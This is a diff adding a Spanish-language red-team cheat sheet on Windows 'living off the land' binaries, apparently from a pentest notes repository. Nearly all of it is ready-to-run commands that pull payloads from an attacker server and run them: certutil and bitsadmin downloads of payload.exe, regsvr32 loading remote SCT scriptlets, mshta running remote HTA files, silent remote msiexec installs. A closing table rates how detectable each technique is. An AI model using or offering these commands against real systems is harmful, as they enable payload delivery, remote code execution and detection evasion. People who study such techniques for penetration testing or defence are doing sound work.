@@ -1,0 +1,233 @@
+# LOLBins - Living Off The Land Binaries
+
+Binarios legítimos de Windows utilizados para transferencias de archivos.
+
+## certutil
+
+### Descargar archivos
+
+```cmd
+:: Descarga básica
+certutil -urlcache -split -f http://192.168.1.100/file.txt file.txt
+
+:: Descargar con nombre original
+certutil -urlcache -split -f http://192.168.1.100/payload.exe
+
+:: Descargar a directorio específico
+certutil -urlcache -split -f http://192.168.1.100/file.txt C:\Temp\file.txt
+```
+
+### Codificar/Decodificar Base64
+
+```cmd
+:: Codificar archivo
+certutil -encode file.txt encoded.txt
+
+:: Decodificar archivo
+certutil -decode encoded.txt decoded.txt
+
+:: Decodificar desde URL
+certutil -urlcache -split -f http://192.168.1.100/encoded.txt encoded.txt && certutil -decode encoded.txt decoded.txt
+```
+
+### Limpiar caché
+
+```cmd
+:: Eliminar caché de certutil
+certutil -urlcache -split -f http://192.168.1.100/file.txt delete
+```
+
+## bitsadmin
+
+### Crear y ejecutar trabajo
+
+```cmd
+:: Crear trabajo
+bitsadmin /create download_job
+
+:: Agregar archivo
+bitsadmin /addfile download_job http://192.168.1.100/file.txt C:\Temp\file.txt
+
+:: Ejecutar
+bitsadmin /resume download_job
+
+:: Verificar estado
+bitsadmin /info download_job
+
+:: Completar (mover a destino final)
+bitsadmin /complete download_job
+```
+
+### Descarga directa
+
+```cmd
+:: Descarga directa (Windows 8+)
+bitsadmin /transfer download_job /download /priority normal http://192.168.1.100/file.txt C:\Temp\file.txt
+```
+
+## PowerShell
+
+### Invoke-WebRequest
+
+```powershell
+# Descarga básica
+Invoke-WebRequest -Uri 'http://192.168.1.100/file.txt' -OutFile 'file.txt'
+
+# Alias corto
+iwr -uri http://192.168.1.100/file.txt -o file.txt
+
+# Con credenciales
+Invoke-WebRequest -Uri 'http://192.168.1.100/file.txt' -OutFile 'file.txt' -Credential $cred
+```
+
+### WebClient
+
+```powershell
+# Método más compatible
+(New-Object Net.WebClient).DownloadFile('http://192.168.1.100/file.txt', 'file.txt')
+
+# Silent download
+(New-Object Net.WebClient).DownloadFileAsync('http://192.168.1.100/file.txt', 'file.txt')
+
+# Con proxy
+$wc = New-Object Net.WebClient
+$wc.Proxy = [Net.WebRequest]::GetSystemWebProxy()
+$wc.DownloadFile('http://192.168.1.100/file.txt', 'file.txt')
+```
+
+### Start-BitsTransfer
+
+```powershell
+# Descarga
+Start-BitsTransfer -Source 'http://192.168.1.100/file.txt' -Destination 'file.txt'
+
+# Descarga asíncrona
+Start-BitsTransfer -Source 'http://192.168.1.100/file.txt' -Destination 'file.txt' -Asynchronous
+```
+
+## regsvr32
+
+### Ejecutar script remoto
+
+```cmd
+:: Ejecutar script SCT desde URL
+regsvr32 /s /n /u /i:http://192.168.1.100/script.sct scrobj.dll
+```
+
+### Script SCT de ejemplo
+
+```xml
+<?xml version="1.0"?>
+<scriptlet>
+<registration progid="ShortJSR" classid="{10001111-0000-0000-0000-0000FEEDACDC}">
+<script language="JScript">
+    var r = new ActiveXObject("WScript.Shell").Run("cmd /c echo LOLBin executed");
+</script>
+</registration>
+</scriptlet>
+```
+
+## mshta
+
+### Ejecutar HTA remoto
+
+```cmd
+mshta http://192.168.1.100/payload.hta
+```
+
+### HTA de ejemplo
+
+```html
+<html>
+<head>
+<script language="VBScript">
+    Set shell = CreateObject("WScript.Shell")
+    shell.Run "cmd /c certutil -urlcache -split -f http://192.168.1.100/file.txt file.txt", 0
+    window.close
+</script>
+</head>
+<body>
+</body>
+</html>
+```
+
+## msiexec
+
+### Instalar MSI remoto
+
+```cmd
+:: Instalación silenciosa
+msiexec /q /i http://192.168.1.100/installer.msi
+
+:: Con parámetros
+msiexec /q /i http://192.168.1.100/installer.msi PARAMETER="value"
+```
+
+## cscript/wscript
+
+### Descargar con script
+
+```vbscript
+' download.vbs
+Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
+objXMLHTTP.open "GET", "http://192.168.1.100/file.txt", False
+objXMLHTTP.send()
+
+If objXMLHTTP.Status = 200 Then
+    Set objADOStream = CreateObject("ADODB.Stream")
+    objADOStream.Open
+    objADOStream.Type = 1
+    objADOStream.Write objXMLHTTP.ResponseBody
+    objADOStream.Position = 0
+    objADOStream.SaveToFile "file.txt"
+    objADOStream.Close
+End If
+```
+
+```cmd
+cscript download.vbs
+```
+
+## explorer.exe
+
+### Abrir URL
+
+```cmd
+:: Abre URL en navegador
+explorer http://192.168.1.100/file.txt
+
+:: Conecta a WebDAV
+explorer \\192.168.1.100@80\DavWWWRoot
+```
+
+## makecab
+
+### Comprimir antes de transferir
+
+```cmd
+:: Comprimir archivo
+makecab file.txt file.cab
+
+:: Expandir archivo
+expand file.cab C:\Temp\file.txt
+```
+
+## extrac32
+
+```cmd
+:: Extraer archivo
+extrac32 /C file.cab C:\Temp\file.txt
+```
+
+## Resumen
+
+| LOLBin | Función | Detección |
+|--------|---------|-----------|
+| certutil | Download/Encode | Media |
+| bitsadmin | Background download | Baja |
+| PowerShell | Download completo | Alta |
+| regsvr32 | Ejecutar script remoto | Media |
+| mshta | Ejecutar HTA remoto | Media |
+| msiexec | Instalar MSI remoto | Baja |
+| cscript | Scripting download | Baja |
+| explorer | WebDAV/Navegador | Muy baja |
